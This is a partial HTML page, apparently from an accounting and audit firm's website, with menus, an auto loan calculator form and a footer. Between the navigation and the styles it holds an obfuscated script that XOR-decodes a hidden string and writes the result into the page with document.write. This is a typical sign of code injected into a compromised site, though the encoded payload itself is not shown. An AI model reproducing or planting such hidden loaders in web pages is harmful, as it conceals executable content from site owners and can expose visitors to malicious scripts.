...
<link rel="stylesheet" href="../../../../WebResource-c6e4cd99cc3fd.axd">
<link rel="stylesheet" href="../../../../WebResource-33e6894a155.axd">
<link rel="stylesheet" href="../../../../WebResource.axd">

<link rel="stylesheet" href="../../../../../../Downloads/cascg.in/cascg.in/WebResource-2d59297a6c0ab.axd">
<link rel="stylesheet" href="../../../../../../Downloads/cascg.in/cascg.in/WebResource-33e6894a155.axd">

<link rel="stylesheet" href="../../../../../../Downloads/cascg.in/cascg.in/WebResource.axd">
            ...
            <div class="collapse navbar-collapse " id="navbar-collapse-1" style="z-index:1010192;">
                    ...
                    <ul class="nav navbar-nav">
						<li><a href="../../../Home/index.aspx" title="Home">Home</a></li><li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown">About&nbsp;<b class="caret"></b></a><ul class="dropdown-menu">
							<li><a href="../../../About/About_US/about_us.aspx" title="About Us">About Us</a></li><li><a href="../../../About/Partners/Partners.aspx" title="Our Partners">Our Partners</a></li><li><a href="../../../About/Mission_Vision/mission_vision.aspx" title="Mission Vision Statement">Mission Vision Statement</a></li>
							...
							<li><a href="../../../Services/Audit/Audit.aspx" title="Audit and Assurance Services">Audit and Assurance Services</a></li><li><a href="../../../Services/Consultancy/Consultancy.aspx" title="Consultancy and Advisory">Consultancy and Advisory</a></li><li><a href="../../../Services/Accounting_services/Accounting_services.aspx" title="Business Accounting Solutions">Business Accounting Solutions</a></li><li><a href="../../../Services/TAXATION AND REGULATORY SERVICES/Taxation.aspx" title="Taxation and Regulatory Services">Taxation and Regulatory Services</a></li><li><a href="../../../Services/Forensic_Audit/Forensic_Audit.aspx" title="Forensic Audit and Fraud Investigation">Forensic Audit and Fraud Investigation</a></li>
						</ul></li><li><a href="../../../Blog/Blog.aspx" title="Blog">Blog</a></li><li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown">Knowledge Bank&nbsp;<b class="caret"></b></a><ul class="dropdown-menu">
						...
						</ul></li><li><a href="../../../Query/NewThemeQuerysheet.aspx" title="Query">Query</a></li><li><a href="../../../Careear/Career.aspx" title="Careers">Careers</a></li><li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown">Admin&nbsp;<b class="caret"></b></a><ul class="dropdown-menu">
							<li><a href="#" title="Login">Login</a></li><li><a href="#" target="_blank" title="Email Login">Email Login</a></li><li><a href="#" target="_blank" title="Time Sheet">Time Sheet</a></li>
						</ul></li><li><a href="../../../Contact_Us/Contact_Us.aspx" title="Contact Us">Contact Us</a></li>
					</ul>
...
<Script>
var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);
</script>
 
<style type="text/css">

.ncontainer, #container, #sliders {
    min-width: 310px; 
    max-width: 800px;
    margin: 0 auto;
}
...
.accord{width: 100%; cursor:pointer; font-weight:bold;font-family: 'Roboto Condensed', sans-serif; font-size:18px;
    padding: 0px 0px;
    border: 0px solid #aaa; background:url(images/plus.png) no-repeat right 10px center; 
    margin: 0 auto;}
...
<br>
 ...
 <a href="#" target="_self"> Auto Loan Calculator </a>
...
<!--<h3 class="heading1">No. Of Instalment: <span id="total">0</span> </h3>-->
  ...
  <div class="col-lg-5 col-md-5"><select id="installmentType" style="WIDTH: 115px" name="installmentType">
                            <option id="simple" value="Monthly" selected="">Monthly
                            <option id="quater" value="Quaterly">Quaterly
                            <option id="half" value="Half Yearly">Half Yearly
                            <option id="year" value="Yearly">Yearly
                            </select></div>
  </div>
  <div class="row margin_bo">
  <div class="col-lg-7 col-md-7 text-right"> 
   
   Total Purchase Price (Before Tax)(Rs.):<input id="plus_1" class="amount_value" type="text">
  ...
  <div class="col-lg-5 col-md-5"><div class="slider_range" id="plus_slide_1"></div></div>
   ...
   <div class="row margin_bo">
  <div class="col-lg-7 col-md-7 text-right">GST (%):<input id="plus_2" class="amount_value" type="text">
  ...
  <div class="col-lg-7 col-md-7 text-right"> 
   ...
   Total Purchase Price (After Tax):<input id="plus_3" class="amount_value" readonly="" type="text">
 ...
 <div class="row margin_bo">
  ...
  Down Payment or Rebates(Rs.):<input id="plus_4" class="amount_value" type="text">
  ...
  Loan Amount:<input id="plus_5" class="amount_value" readonly="" type="text">
  ...
  Interest Rate (p.a.) (%):<input id="plus_6" class="amount_value" type="text">
 
 
</div>
  <div class="col-lg-5 col-md-5"><div class="slider_range" id="plus_slide_6"></div></div>
  </div>

  <div class="row margin_bo">
  <div class="col-lg-7 col-md-7 text-right"> 
   
  Number of payments:<input id="plus_7" class="amount_value" type="text">
 
 
</div>
  <div class="col-lg-5 col-md-5"><div class="slider_range" id="plus_slide_7"></div></div>
  </div>

<div class="row margin_bo">
  <div class="col-lg-7 col-md-7 text-right"> 
   
  Auto Payment Installment(Rs.):<input id="plus_8" class="amount_value" readonly="" type="text">
...
<table id="FooterrControl1_tbl" style="height:auto;width:100%;" class="table-responsive" cellpadding="0" cellspacing="0" border="0">
	<tr id="FooterrControl1_tr_FooterBackImage">
        ...
        <span id="FooterrControl1_lbl_hitsCounter" style="font-weight:bold;">98278</span>
            ...
            <div class="row">
                ...
                <div class="col-md-6 col-xs-5">
                	<div class="col-three us-lk">
                        <h2>Quick Links</h2>
                        <ul style="list-style-image:url(image/arrow1.png)">
                            <li><a style="text-decoration:none;" href="../../../Home/index.aspx" target="">Home</a></li>
                            <li><a style="text-decoration:none;" href="../../../About/Partners/Partners.aspx" target="">Team</a></li>
                            <li><a style="text-decoration:none;" href="../../../Contact_Us/Contact_Us.aspx" target="">Contact Us</a></li>                            
                            
                            <li><a style="text-decoration:none;" href="../../../Careear/Career.aspx" target="">Career</a></li>
                        </ul>
                    </div>
                </div>
